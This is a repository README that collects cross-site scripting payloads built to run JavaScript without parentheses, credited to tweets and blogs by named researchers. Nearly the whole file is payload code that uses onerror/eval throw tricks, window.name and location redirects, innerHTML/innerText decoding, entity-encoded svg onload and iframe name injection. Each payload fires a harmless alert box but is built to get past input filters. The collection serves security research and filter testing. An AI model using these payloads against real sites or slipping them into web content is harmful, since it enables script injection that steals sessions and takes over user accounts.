# XSS Without parentheses () 


### This repo contains XSS payloads that doesn't require parentheses, collected from tweets, blogs...
### All the POC's are alert box with number 23

---
    alert`23`
---
    window.name="javascript:alert(23)";
    location="xss.html";
xss.html

    location=name

---

[terjanq](https://twitter.com/terjanq)

    window.name="alert(23)";
    location="xss.html";
xss.html

    Function`a${name}```


---
[Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/)

    onerror=alert;throw 23;

---
Only Chrome [Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/)

    onerror=eval;throw'=alert\x2823\x29';
    
---
[Garethheyes](https://twitter.com/garethheyes/status/1126526480614416395)

    {onerror=alert}throw 23

----
[terjanq](https://twitter.com/terjanq/status/1126614389371621378)

xss_redir.html
```
window.name='1;var Uncaught=1;alert(23)';
location='xss_short.html';
```
xss_short.html
```
{onerror=eval}throw/0/+name
```

---

[terjanq](https://twitter.com/terjanq/status/1126796552960389120)

    throw/a/,Uncaught=1,g=alert,a=g+0,onerror=eval,/1/g+a[14]+[23,331,337]+a[15]

---
Only Firefox [Garethheyes](https://twitter.com/garethheyes/status/1126922526796468224)
          
    {onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:'',message:'alert\x2823\x29'}
---

[ycam](https://twitter.com/ycam_asafety/status/1126976315666706433)

```
example.com/xss#*/;alert(23);
```
```
throw/**/onerror=Uncaught=eval,e={lineNumber:1,columnNumber:1,fileName:'',message:'/*'+location.hash},typeof/**/InstallTrigger!='undefined'?e:e.message
```
---
[cgvwzq](https://twitter.com/cgvwzq/status/1126994744268267527)

[https://demo.vwzq.net/lol.html](https://demo.vwzq.net/lol.html)

```
<script/id=Uncaught>

// chrome + firefox

throw[onerror=eval][e=[x=/-alert(1)/.source]]=0[e.lineNumber=e.columnNumber=e.fileName=e.message=x]=e

</script>

<script>

// firefox

onhashchange=setTimeout,HashChangeEvent.prototype[Symbol.toStringTag]=/=alert(2)/.source,location.hash=1

</script>

<script>

// chrome + firefox

Array.prototype[Symbol.hasInstance]=eval,'alert(3)'instanceof[]

</script>

<script>

// chrome

[onerror=eval][TypeError.prototype.name='=/']['/-alert(4)//']

</script>

<script>

// chrome

onerror=eval,ReferenceError.prototype.name='=alert(5)//',lol

</script>
```

---
[Renwa](https://twitter.com/RenwaX23/status/1126999364763832325)

```
document.body.innerText="\u003cimg src=x onerror=alert\u002823\u0029\u003e";
document.body.innerHTML=document.body.innerText;
```
    
---
[Renwa](https://twitter.com/RenwaX23)

```
document.body.innerHTML="&ltimg src=x onerror=alert&lpar;23&rpar;&gt"
document.body.innerHTML=document.body.innerText
```
---
If the page is frameable [Renwa](https://twitter.com/RenwaX23/status/1125387416175546368)

```
data:text/html,<iframe name="<svg/onload=alert(23)>" src="http://example.com/xss?document.body.innerHTML=name">
```
---
[user00239123](https://stackoverflow.com/a/40899496/9216926)

    document.location='javascript:alert%2823%29'

---
Only IE [matt](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/#comment-2157)
   
    example.com/xss#<img src=x onerror=alert(23)>
    
    document.body.innerHTML=location.hash;
---
[Brutelogic](https://twitter.com/brutelogic/status/585944389589065728)
    
    <svg/onload='alert&#40 23 &#41'> 

---
[Blakils](https://twitter.com/Blaklis_/status/1125663871056928769)

    location=/javascript:alert%2823%29/.source;
---
[Nicocanicolas](https://twitter.com/nicocanicolas/status/1125399154560307205)

    http://example.com/?test=&lt;img/src=&quot;x&quot;/onerror=alert(23)&gt;
    
    document.body.innerHTML=location.search;
    document.body.innerHTML=document.body.innerText;

---


___
### Anything: @[RenwaX23](https://twitter.com/RenwaX23)
